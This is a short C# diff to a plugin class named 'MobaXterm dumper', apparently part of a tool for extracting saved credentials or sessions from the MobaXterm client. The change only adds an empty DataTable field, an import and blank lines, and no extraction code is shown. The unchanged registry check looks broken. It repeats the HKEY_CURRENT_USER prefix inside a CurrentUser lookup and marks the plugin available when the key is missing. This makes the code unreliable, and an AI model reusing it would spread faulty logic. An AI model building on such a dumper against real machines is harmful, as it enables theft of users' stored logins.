@@ -2,6 +2,7 @@
 using Plugin.Abstractions48;
 using System;
 using System.Collections.Generic;
+using System.Data;
 using System.Linq;
 using System.Text;
 using System.Text.RegularExpressions;
@@ -11,11 +12,15 @@ namespace Plugin48Dumper
 {
     public class clsMobaXtermDumper : clsDumper
     {
+        public DataTable dtHelp = new DataTable();
+
         public clsMobaXtermDumper()
         {
             Entry = "xterm";
             Description = "MobaXterm dumper";
             Usage = string.Empty;
+
+
 
             Available = Registry.CurrentUser.OpenSubKey("HKEY_CURRENT_USER\\SOFTWARE\\Mobatek\\MobaXterm\\") == null;
         }
